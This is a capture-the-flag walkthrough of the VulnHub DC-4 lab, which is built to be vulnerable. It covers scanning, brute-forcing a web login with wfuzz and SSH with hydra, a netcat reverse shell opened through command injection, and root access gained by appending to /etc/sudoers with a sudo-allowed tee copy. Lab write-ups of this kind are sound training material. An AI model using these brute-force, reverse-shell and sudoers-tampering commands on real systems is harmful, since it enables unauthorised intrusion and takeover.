---
title: DC-4 - WRITE-UP
date: 2020-06-09 08:46:00 +0100
categories: [VulnHub, DC]
tags: [beginner, wfuzz, hydra, tee, nginx, cms, sudoers]
lang: en
---

## MAIN INFORMATION
### BOX NAME: DC: 4
### DESCRIPTION

```
DC-4 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.

Unlike the previous DC releases, this one is designed primarily for beginners/intermediates. There is only one flag, but technically, multiple entry points, and just like last time, no clues.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

For beginners, Google can be of great assistance, but you can always tweet me at @ DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.
```

## NMAP
First, fire up nmap
```bash
$ nmap -T4 -A -p- 192.168.56.115
Starting Nmap 7.80 (https://nmap.org) at 2020-06-07 04:03 EDT
Nmap scan report for 192.168.56.115
Host is up (0.00017s latency).
Not shown: 65533 closed ports
PORT STATE SERVICE VERSION
22 / tcp open ssh OpenSSH 7.4p1 Debian 10 + deb9u6 (protocol 2.0)
| ssh-hostkey:
| 2048 8d: 60: 57: 06: 6c: 27: e0: 2f: 76: 2c: e6: 42: c0: 01: ba: 25 (RSA)
| 256 e7: 83: 8c: d7: bb: 84: f3: 2e: e8: a2: 5f: 79: 6f: 8e: 19: 30 (ECDSA)
| _ 256 fd: 39: 47: 8a: 5e: 58: 33: 99: 73: 73: 9e: 22: 7f: 90: 4f: 4b (ED25519)
80 / tcp open http nginx 1.15.10
| _http-server-header: nginx / 1.15.10
| _http-title: System Tools
Service Info: OS: Linux; CPE: cpe: / o: linux: linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
```
We see an open http port with a login panel on it.

![Imgur](https://i.imgur.com/WRMZG9u.png)

## GOBUSTER
```bash
$ gobuster dir --url http://192.168.56.115 --wordlist /usr/share/wordlists/dirb/common.txt
================================================== =============
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
================================================== =============
[+] Url: http://192.168.56.115
[+] Threads: 10
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster / 3.0.1
[+] Timeout: 10s
================================================== =============
2020/06/07 02:19:24 Starting gobuster
================================================== =============
/ css (Status: 301)
/ images (Status: 301)
/index.php (Status: 200)
================================================== =============
2020/06/07 02:19:24 Finished
================================================== =============
```

With Wappalyzer we can find out that nginx version is 1.15. However, there are no exploits for this version.

I checked the possibility of getting an admin a lot. Nothing remains but to brute-force the admin password. We will not use python requests for this, because multithreading plays an important role here

## Brute-force page login panel

Brute-forcing the login panel on the site can be confusing and complicated. We need to know:
- variables to which login data are assigned (usually it is 'login' and 'password'),
- domain directory where the login script is located,
- a message that is displayed when we are unable to log in or vice versa.
- Whether it's the type of POST or GET request
- Are there any mandatory cookies the host must have when cracking the hash
- and lots of other stuff

One of the tools to check this information is the 'HTTP Header Live' browser plug-in

![Imgur](https://i.imgur.com/8ZnEqGA.png)
### Hydra - WEBPAGE

```
hydra -l test -P dict.txt 192.168.56.115 http-post-form "/login.php:login=^USER^&password=^PASS ^: <String_message_displayed_after_of_successful_trial>` ```

Sorry, but we have no message after a failed login attempt. The page does not display any message. After reviewing the manpage, I don't see the HTTP status filtering option. We need to find an alternative.

### wfuzz

wfuzz is a much more intelligent tool. This, however, makes it much more complicated than Hydra. I made the script

```bash
wfuzz -c -v -w /usr/share/wordlists/rockyou.txt -d "username = admin & password = FUZZ" -u http://192.168.56.115/login.php/
```
However, I am not getting any output.

I did with another dictionary file.
```bash
wfuzz -c -v -w /usr/share/wordlists/wfuzz/others/common_pass.txt -d "username = admin & password = FUZZ" -u http://192.168.56.115/login.php/

************************************************** ******
* Wfuzz 2.4.5 - The Web Fuzzer *
************************************************** ******

Target: http://192.168.56.115/login.php/
Total requests: 52

================================================== ================================================== ==============================================
ID C. Time Response Lines Word Chars Server Redirect
================================================== ================================================== ==============================================

000000001: 0.002s 404 7 L 11 W 154 Ch nginx / 1.15.10
000000002: 0.001s 404 7 L 11 W 154 Ch nginx / 1.15.10
000000003: 0.004s 404 7 L 11 W 154 Ch nginx / 1.15.10
000000004: 0.001s 404 7 L 11 W 154 Ch nginx / 1.15.10
000000005: 0.001s 404 7 L 11 W 154 Ch nginx / 1.15.10

Total time: 0.063478
Processed Requests: 52
Filtered Requests: 0
Requests / sec .: 819.1784
```
Managed to run the script, but brute-force failed, so maybe the point is that wfuzz parse the rockyou.txt list incorrectly? I have created a new file.

```bash
 cat /usr/share/wordlists/rockyou.txt | head -c 100000 >> New_pass.txt

```
I used the wfuzz command

```bash
wfuzz -c -w NowaLista.txt -d "username = admin & password = FUZZ" --hc 302 -u http://192.168.56.115/login.php
```
> --hc is the flag for "hide code". With it, responses that have in the "code" 302 - Our HTTP status are hidden
After launching, brute-forcing occurs, but we are unable to get the password.

By learning more precisely what the HTTP 302 status is, I saw that it only talks about redirection.

So we need another variable. I saw that each request has a character length of 206

![Imgur](https://i.imgur.com/deoWvZQ.png)

So I give it as "variable"

```bash
$ wfuzz -c -w NewList.txt -d "username = admin & password = FUZZ" --hh 206 -u http://192.168.56.115/login.php
```
> --hh is a flag that hides responses with a certain number of characters

![Imgur](https://i.imgur.com/bxj4LS6.png)

The difference is with the password "happy". I'm trying it

![Imgur](https://i.imgur.com/jWiHOo5.png)

We got in and we can execute the selected commands. Let's use the Burp Suite to find out what is being done.
It is executed with any system command.
## REVERSE SHELL
Let's see if we can get a reverse shell

![Imgur](https://i.imgur.com/KkJAZkU.png)

We obtain.
```bash
nc + -e + / bin / bash + 192.168.56.103 + 1234
```
 I improve shell by importing bash from python.

```bash
python -c "import pty; pty.spawn ('/ bin / bash')"
```
By doing ```cat / etc / passwd```I can see that there are other users besides root. charles, sam, jim

In jim's directory we see a list of old passwords. As the ssh port is open, I check with Hydra

```bash
hydra -l jim -P dictionary.txt 192.168.56.119 -V -t4 ssh


[ATTEMPT] target 192.168.56.119 - login "jim" - pass "brandy" - 218 of 253 [child 0] (0/0)
[ATTEMPT] target 192.168.56.119 - login "jim" - pass "starwars1" - 219 of 253 [child 1] (0/0)
[ATTEMPT] target 192.168.56.119 - login "jim" - pass "barney" - 220 of 253 [child 2] (0/0)
[ATTEMPT] target 192.168.56.119 - login "jim" - pass "natalia" - 221 of 253 [child 3] (0/0)
[ATTEMPT] target 192.168.56.119 - login "jim" - pass "jibril04" - 222 of 253 [child 0] (0/0)
[22] [ssh] host: 192.168.56.119 login: jim password: jibril04

```
**login: jim password: jibril04**.

## ENUMERATION
### Mailbox
I'm logging in to ssh. An interesting file is mbox. This is a test mailbox file. Only where is the main mailbox folder?

![Imgur](https://i.imgur.com/KPU756d.png)

/ var / mail. I go in and it turns out there is also a mail "jim"

```
From charles @ dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles @ dc-4>
Envelope-to: jim @ dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
(envelope-from <charles @ dc-4>)
id 1hCjIX-0000kO-Qt
for jim @ dc-4; Sat, 06 Apr 2019 21:15:45 +1000
This: jim @ dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text / plain; charset = "UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt @ dc-4>
From: Charles <charles @ dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is: ^ xHhA & hvim0y

See ya,
Charles


```
So we have Charles' password. I log in to his account.
After running the command ```sudo -l```I can see that charles has root rights to the file / usr / bin / teehee

```bash
$ teehee --help
Usage: teehee [OPTION] ... [FILE] ...
Copy standard input to each FILE, and also to standard output.

  -a, --append append to the given FILEs, do not overwrite
  -i, --ignore-interrupts ignore interrupt signals
  -p diagnose errors writing to non pipes
      --output-error [= MODE] set behavior on write error. See MODE below
      --help display this help and exit
      --version output version information and exit

MODE determines behavior with write errors on the outputs:
  'warn' diagnose errors writing to any output
  'warn-nopipe' diagnose errors writing to any output not a pipe
  'exit' exit on error writing to any output
  'exit-nopipe' exit on error writing to any output not a pipe
The default MODE for the -p option is 'warn-nopipe'.
The default operation when --output-error is not specified, is to
exit immediately on error writing to a pipe, and diagnose errors
writing to non pipe outputs.

GNU coreutils online help: <http://www.gnu.org/software/coreutils/>
Full documentation at: <http://www.gnu.org/software/coreutils/tee>
or available locally via: info '(coreutils) tee invocation'
```

## PRIVILEGE ESCALATION
I associate the name "teehee" with the "tee" program which separates the output into input and output. I check gtfobins.io for ways to escalate tee permissions. One "scenario" fits us

```
Sudo

It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.

    LFILE = file_to_write
    echo DATE | sudo tee -a "$ LFILE"

```
Just what file will we edit? I will choose the / etc / sudoers file which holds the permissions for users

```bash
echo "charles ALL = (ALL: ALL) ALL" | sudo teehee -a / etc / sudoers
```
I am logging in as root.

```bash
$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    # 1) Respect the privacy of others.
    # 2) Think before you type.
    # 3) With great power comes great responsibility.

[sudo] password for charles:
root @ dc-4: / home / charles #
```
There is a flag in the root directory, which I will keep for myself :P.
